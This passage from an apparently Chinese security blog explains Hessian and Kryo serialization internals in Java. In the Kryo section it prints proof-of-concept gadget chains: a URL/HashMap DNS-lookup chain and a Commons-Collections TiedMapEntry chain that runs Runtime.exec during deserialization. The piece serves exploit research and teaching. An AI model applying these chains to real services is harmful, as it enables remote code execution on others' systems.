class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, gender=&#x27;&quot;</span> + gender + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, innerMap=&quot;</span> + innerMap +</span><br><span class="line">                <span class="string">&quot;, friends=&quot;</span> + friends +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Serialize-and-DeSerialize"><a href="#Serialize-and-DeSerialize" class="headerlink" title="Serialize and DeSerialize"></a>Serialize and DeSerialize</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.client;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.Hessian2Input;</span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.Hessian2Output;</span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.HessianInput;</span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.HessianOutput;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.sql.SQLData;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HJSerializationTest</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; <span class="type">byte</span>[] serialize(T t) &#123;</span><br><span class="line">        <span class="type">byte</span>[] data = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ByteArrayOutputStream</span> <span class="variable">os</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">            <span class="type">HessianOutput</span> <span class="variable">output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HessianOutput</span>(os);</span><br><span class="line">            output.writeObject(t);</span><br><span class="line">            data = os.toByteArray();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> data;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">deserialize</span><span class="params">(<span class="type">byte</span>[] data)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (data == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ByteArrayInputStream</span> <span class="variable">is</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(data);</span><br><span class="line">            <span class="type">HessianInput</span> <span class="variable">input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HessianInput</span>(is);</span><br><span class="line">            result = input.readObject();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> (T) result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">id</span> <span class="operator">=</span> <span class="number">111</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;hessian&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">gender</span> <span class="operator">=</span> <span class="string">&quot;boy&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;String, Class&lt;Object&gt;&gt;();</span><br><span class="line">        innerMap.put(<span class="string">&quot;1&quot;</span>, ObjectInputStream.class);</span><br><span class="line">        innerMap.put(<span class="string">&quot;2&quot;</span>, SQLData.class);</span><br><span class="line"></span><br><span class="line">        <span class="type">Student</span> <span class="variable">friend</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Student</span>(<span class="number">222</span>, <span class="string">&quot;hessian1&quot;</span>, <span class="string">&quot;boy&quot;</span>);</span><br><span class="line">        <span class="type">List</span> <span class="variable">friends</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;Student&gt;();</span><br><span class="line">        friends.add(friend);</span><br><span class="line"></span><br><span class="line">        <span class="type">Student</span> <span class="variable">stu</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Student</span>();</span><br><span class="line">        stu.setId(id);</span><br><span class="line">        stu.setName(name);</span><br><span class="line">        stu.setGender(gender);</span><br><span class="line">        stu.setInnerMap(innerMap);</span><br><span class="line">        stu.setFriends(friends);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;---------------hessian serialize----------------&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] obj = serialize(stu);</span><br><span class="line">        System.out.println(<span class="keyword">new</span> <span class="title class_">String</span>(obj));</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;---------------hessian deserialize--------------&quot;</span>);</span><br><span class="line">        <span class="type">Student</span> <span class="variable">student</span> <span class="operator">=</span> deserialize(obj);</span><br><span class="line">        System.out.println(student);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h2><p>1.首先通过需要序列化的类，获取到相应的serializer，在通过这个serializer进行writeobject操作<br><img src="/2023/09/07/hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/2.png" alt></p>
<p>2.一般对于自己写的class，他就会获取到defaultserializer<br><img src="/2023/09/07/hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/3.png" alt></p>
<p>3.在获取serializer的过程中，他会去读取Object中的fields，并对应上serializer<br><img src="/2023/09/07/hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/7.png" alt><br><img src="/2023/09/07/hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/8.png" alt></p>
<p>4.获取完serializer，他会有一个将序列化的obj作为key，serializer作为value，加入到一个map和一个cachemap中<br><img src="/2023/09/07/hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/5.png" alt><br><img src="/2023/09/07/hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/6.png" alt></p>
<p>5.接着就是常规的获取field，然后在根据field的serializer写入数据了<br><img src="/2023/09/07/hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/4.png" alt><br>大概过程就是</p>
<ul>
<li>获取序列化对象相对应的serializer，并获得到fields，每个fields会依次对应上一个serializer</li>
<li>将serializer加入map和cachemap中</li>
<li>根据fields写入序列化数据</li>
</ul>
<h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><p>首先看到他读取了序列化数据中的第一个字节，并判断是属于那种类型的，并在下面的switch语句中选择使用哪种Serializer去进行序列化，在这里是Map，注意这里的Map并不是说反序列化的类是Map类型的，而是所有Object类型都会被这个readMap处理用来反序列化<br><img src="/2023/09/07/hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1.png" alt><br>接下来就是常规的根据field然后deserialize<br>在这里的具体操作就是根据变量名获取到相应的deserialize<br><img src="/2023/09/07/hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/9.png" alt><br>再在deserialize中获取value，并设置field</p>
<p><strong>上面的操作最好还是要自己跟一遍</strong></p>
<h2 id="利用链"><a href="#利用链" class="headerlink" title="利用链"></a>利用链</h2><p>与kryo类似，hessian也是因为反序列化Map类型时会调用put方法<br>那利用点也是从hashCode与equals入手了<br>在这里就不重复造轮子了，可以参考这篇文章</p>
<ul>
<li><a href="https://paper.seebug.org/1131/">https://paper.seebug.org/1131/</a></li>
<li>参考marshalsec</li>
</ul>
]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
        <tag>java</tag>
        <tag>反序列化</tag>
        <tag>hessian</tag>
      </tags>
  </entry>
  <entry>
    <title>kryo反序列化</title>
    <url>/2023/09/07/kryo%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    <content><![CDATA[<h2 id="入门kryo"><a href="#入门kryo" class="headerlink" title="入门kryo"></a>入门kryo</h2><h3 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h3><p>首先看个简单的demo<br><span id="more"></span><br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyClass</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String hello;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> num;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;MyClass&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;hello=&#x27;&quot;</span> + hello + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, num=&quot;</span> + num +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getHello</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> hello;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setHello</span><span class="params">(String hello)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.hello = hello;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getNum</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> num;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setNum</span><span class="params">(<span class="type">int</span> num)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.num = num;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> com.esotericsoftware.kryo.Kryo;</span><br><span class="line"><span class="keyword">import</span> com.esotericsoftware.kryo.io.Input;</span><br><span class="line"><span class="keyword">import</span> com.esotericsoftware.kryo.io.Output;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Kryo</span> <span class="variable">kryo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Kryo</span>();</span><br><span class="line">        kryo.register(MyClass.class);</span><br><span class="line">        <span class="type">MyClass</span> <span class="variable">myClass</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyClass</span>();</span><br><span class="line">        myClass.setHello(<span class="string">&quot;Hello Kryo&quot;</span>);</span><br><span class="line">        myClass.setNum(<span class="number">11</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Output</span> <span class="variable">output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Output</span>(Files.newOutputStream(Paths.get(<span class="string">&quot;file.bin&quot;</span>)));</span><br><span class="line">        kryo.writeObject(output, myClass);</span><br><span class="line">        output.close();</span><br><span class="line"></span><br><span class="line">        <span class="type">Input</span> <span class="variable">input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Input</span>(Files.newInputStream(Paths.get(<span class="string">&quot;file.bin&quot;</span>)));</span><br><span class="line">        <span class="type">MyClass</span> <span class="variable">obj</span> <span class="operator">=</span> kryo.readObject(input, MyClass.class);</span><br><span class="line">        input.close();</span><br><span class="line">        System.out.println(obj);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h3 id="3种序列化与反序列化"><a href="#3种序列化与反序列化" class="headerlink" title="3种序列化与反序列化"></a>3种序列化与反序列化</h3><p>如果是知道序列化类型，并且不为空<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">kryo.writeObject(output, object);</span><br><span class="line"><span class="type">SomeClass</span> <span class="variable">object</span> <span class="operator">=</span> kryo.readObject(input, SomeClass.class);</span><br></pre></td></tr></table></figure><br>如果是知道序列化类型，并且有可能为空<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">kryo.writeObjectOrNull(output, object);</span><br><span class="line"><span class="type">SomeClass</span> <span class="variable">object</span> <span class="operator">=</span> kryo.readObjectOrNull(input, SomeClass.class);</span><br></pre></td></tr></table></figure><br>如果都是不确定的<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">kryo.writeClassAndObject(output, object);</span><br><span class="line"><span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> kryo.readClassAndObject(input);</span><br><span class="line"><span class="keyword">if</span> (object <span class="keyword">instanceof</span> SomeClass) &#123;</span><br><span class="line">   <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h3 id="kryo注册"><a href="#kryo注册" class="headerlink" title="kryo注册"></a>kryo注册</h3><blockquote>
<p>当不知道序列化的类是什么的时候可以不用注册，一般是为了提高反序列化的效率启用这种注册功能。</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Kryo</span> <span class="variable">kryo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Kryo</span>();</span><br><span class="line">kryo.register(SomeClass.class);</span><br><span class="line"><span class="type">Output</span> <span class="variable">output</span> <span class="operator">=</span> ...</span><br><span class="line"><span class="type">SomeClass</span> <span class="variable">object</span> <span class="operator">=</span> ...</span><br><span class="line">kryo.writeObject(output, object);</span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Kryo</span> <span class="variable">kryo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Kryo</span>();</span><br><span class="line">kryo.register(SomeClass.class, <span class="number">9</span>);</span><br><span class="line">kryo.register(AnotherClass.class, <span class="number">10</span>);</span><br><span class="line">kryo.register(YetAnotherClass.class, <span class="number">11</span>);</span><br></pre></td></tr></table></figure>
<p>看到上面两段代码，第一个没有id，他会自动给你分配id，后面那段是在参数中提供id，这个id在序列化和反序列化的时候要保持一致，不能用9的去反序列化10的</p>
<h3 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h3><p>首先获取前面获取的register<br><img src="/2023/09/07/kryo%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1.jpg" alt><br>然后就开始写入序列化数据<br><img src="/2023/09/07/kryo%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/2.png" alt><br>最后会根据serializer类型写入序列化数据，在这里的serializer就是string类型的<br><img src="/2023/09/07/kryo%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/3.png" alt><br>更加详细的就不说了，还是得自己调试才行，总体流程就是</p>
<ul>
<li>获取registration</li>
<li>获取filed，进行filed.write</li>
<li>在write中获取相对应的serializer</li>
<li>调用serializer.write，进行最后的写入</li>
</ul>
<h3 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h3><p>反序列化的流程与序列化基本一致，只不过就是把write改为了read<br>当反序列化的类型为一个Object类型的时候，可以看到如下的过程，先创建一个Object的实例，接着循环把成员变量那些给赋值上<br><img src="/2023/09/07/kryo%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/7.png" alt><br>看看Create中的实现<br><img src="/2023/09/07/kryo%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/8.png" alt><br>他主要有几个步骤</p>
<ul>
<li>获取到无参构造</li>
<li>如果是private类型，就先让他变成可以访问的 -&gt; <em>ctor.setAccessible(true);</em></li>
<li>调用无参构造函数，并返回该实例</li>
</ul>
<p>但是有些利用链可能没有无参构造这时候应该怎么办<br>看到官网<br><img src="/2023/09/07/kryo%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/9.png" alt></p>
<blockquote>
<p>The Objenesis StdInstantiatorStrategy uses JVM specific APIs to create an instance of a class without calling any constructor at all. Using this is dangerous because most classes expect their constructors to be called.<br><code>kryo.setInstantiatorStrategy(new DefaultInstantiatorStrategy(new StdInstantiatorStrategy()));</code><br>当设置这个策略的时候会不调用任何的构造函数</p>
</blockquote>
<h2 id="常用调用链"><a href="#常用调用链" class="headerlink" title="常用调用链"></a>常用调用链</h2><p>常用的调用链基本是因为HashMap.put中,会调用到key的equals方法和hashcode方法，而key又是我们可控的，这时候就可以进行一些常规的调用链利用了<br><img src="/2023/09/07/kryo%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/6.png" alt><br>首先看到他先反序列化了key，接着反序列化了value，最后进行了put操作</p>
<h3 id="hashCode利用"><a href="#hashCode利用" class="headerlink" title="hashCode利用"></a>hashCode利用</h3><p><img src="/2023/09/07/kryo%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/12.png" alt><br>可以看到hash中触发了key的hashcode方法</p>
<h4 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h4><p>首先是最简单的URL利用链<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> com.esotericsoftware.kryo.Kryo;</span><br><span class="line"><span class="keyword">import</span> com.esotericsoftware.kryo.io.Input;</span><br><span class="line"><span class="keyword">import</span> com.esotericsoftware.kryo.io.Output;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Array;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.URI;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.net.URLStreamHandler;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Kryo</span> <span class="variable">kryo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Kryo</span>();</span><br><span class="line">        kryo.setRegistrationRequired(<span class="literal">false</span>);</span><br><span class="line">        HashMap&lt;Object, Object&gt; s = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        setFieldValue(s, <span class="string">&quot;size&quot;</span>, <span class="number">1</span>);</span><br><span class="line">        Class&lt;?&gt; nodeC;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Node&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Entry&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        Constructor&lt;?&gt; nodeCons = nodeC.getDeclaredConstructor(<span class="type">int</span>.class, Object.class, Object.class, nodeC);</span><br><span class="line">        nodeCons.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">URL</span> <span class="variable">v2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://x.xxx.tu4.org&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">tbl</span> <span class="operator">=</span> Array.newInstance(nodeC, <span class="number">2</span>);</span><br><span class="line">        Array.set(tbl, <span class="number">0</span>, nodeCons.newInstance(<span class="number">0</span>, v2, <span class="number">0</span>, <span class="literal">null</span>));</span><br><span class="line">        setFieldValue(s, <span class="string">&quot;table&quot;</span>, tbl);</span><br><span class="line"></span><br><span class="line">        <span class="type">Output</span> <span class="variable">output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Output</span>(Files.newOutputStream(Paths.get(<span class="string">&quot;file.bin&quot;</span>)));</span><br><span class="line">        kryo.writeClassAndObject(output,s);</span><br><span class="line">        output.close();</span><br><span class="line">        <span class="type">Input</span> <span class="variable">input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Input</span>(Files.newInputStream(Paths.get(<span class="string">&quot;file.bin&quot;</span>)));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> kryo.readClassAndObject(input);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>具体就不分析了，就是会触发URL.hashcode最后触发dnslog</p>
<h4 id="TiedMapEntry"><a href="#TiedMapEntry" class="headerlink" title="TiedMapEntry"></a><h3 style="text-decoration: line-through;">TiedMapEntry</h3></h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.esotericsoftware.kryo.Kryo;</span><br><span class="line"><span class="keyword">import</span> com.esotericsoftware.kryo.io.Input;</span><br><span class="line"><span class="keyword">import</span> com.esotericsoftware.kryo.io.Output;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> org.objenesis.strategy.StdInstantiatorStrategy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Array;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> org.example.Test.setFieldValue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Kryo</span> <span class="variable">kryo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Kryo</span>();</span><br><span class="line"></span><br><span class="line">        kryo.setRegistrationRequired(<span class="literal">false</span>);</span><br><span class="line">        kryo.setInstantiatorStrategy(<span class="keyword">new</span> <span class="title class_">StdInstantiatorStrategy</span>());</span><br><span class="line"></span><br><span class="line">        Transformer[] transformer = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;open -a Calculator&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">ct</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformer);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">innermap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazymap</span> <span class="operator">=</span> LazyMap.decorate(innermap,<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">0</span>));</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">mp</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazymap,<span class="string">&quot;lsf&quot;</span>);</span><br><span class="line">        lazymap.clear();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> LazyMap.class.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(lazymap,ct);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; s = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        setFieldValue(s, <span class="string">&quot;size&quot;</span>, <span class="number">1</span>);</span><br><span class="line">        Class&lt;?&gt; nodeC;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Node&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Entry&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        Constructor&lt;?&gt; nodeCons = nodeC.getDeclaredConstructor(<span class="type">int</span>.class, Object.class, Object.class, nodeC);</span><br><span class="line">        nodeCons.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">v2</span> <span class="operator">=</span> tiedMapEntry;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">tbl</span> <span class="operator">=</span> Array.newInstance(nodeC, <span class="number">2</span>);</span><br><span class="line">        Array.set(tbl, <span class="number">0</span>, nodeCons.newInstance(<span class="number">0</span>, v2, v2, <span class="literal">null</span>));</span><br><span class="line">        setFieldValue(s, <span class="string">&quot;table&quot;</span>, tbl);</span><br><span class="line"></span><br><span class="line">        <span class="type">Output</span> <span class="variable">output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Output</span>(Files.newOutputStream(Paths.get(<span class="string">&quot;file.bin&quot;</span>)));</span><br><span class="line">        